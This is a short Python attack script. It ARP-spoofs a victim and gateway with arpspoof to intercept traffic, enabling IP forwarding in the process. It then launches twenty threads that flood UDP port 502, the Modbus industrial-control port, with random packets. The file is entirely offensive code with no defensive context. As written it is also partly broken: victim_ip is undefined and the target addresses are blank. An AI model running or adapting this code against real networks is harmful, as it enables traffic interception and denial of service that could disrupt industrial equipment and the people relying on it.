import os
import subprocess
import threading
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2048)
gateway_ip = ""
ip = ""
port = 502
sent = 0


def mitm(victim_ip, gateway_ip):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    proc = subprocess.Popen(args=["arpspoof", "-i", "eth0", "-t", victim_ip, "-r", gateway_ip], stdout=subprocess.PIPE)
    time.sleep(30)
    proc.kill()
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def dos_attack(ip, port):
    global sent, bytes
    while True:
        sock.sendto(bytes, (ip, port))


mitm(victim_ip, gateway_ip)
time.sleep(30)

# Until the mimtm Done
for i in range(20):
    threading.Thread(target=dos_attack, args=[ip, port]).start()
